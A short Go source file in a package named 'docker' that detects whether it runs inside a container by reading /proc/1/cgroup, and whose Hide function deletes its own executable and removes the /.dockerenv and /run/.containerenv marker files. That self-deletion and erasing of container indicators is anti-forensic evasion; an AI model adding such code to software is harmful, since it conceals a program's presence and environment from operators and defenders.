package docker

import (
	"io/ioutil"
	"os"
	"strings"
)

func Hide() {
	//> Remove myself
	exe, err := os.Executable()
	if err != nil {
		panic(err)
	}
	if err := os.Remove(exe); err != nil {
		panic(err)
	}

	//> Remove `/.dockerenv` and `/run/.containerenv`
	if err := os.Remove(`/.dockerenv`); err != nil && !os.IsNotExist(err) {
		panic(err)
	}

	if err := os.Remove(`/run/.containerenv`); err != nil && !os.IsNotExist(err) {
		panic(err)
	}
}

func WhereAmI() (inDocker bool, err error) {
	// TODO? check `/.dockerenv` or `/run/.containerenv`

	data, err := ioutil.ReadFile("/proc/1/cgroup")
	if err != nil {
		if os.IsNotExist(err) {
			return false, nil
		} else {
			return false, err
		}
	}

	if strings.Contains(string(data), "/docker/") {
		return true, nil
	}

	return false, nil
}
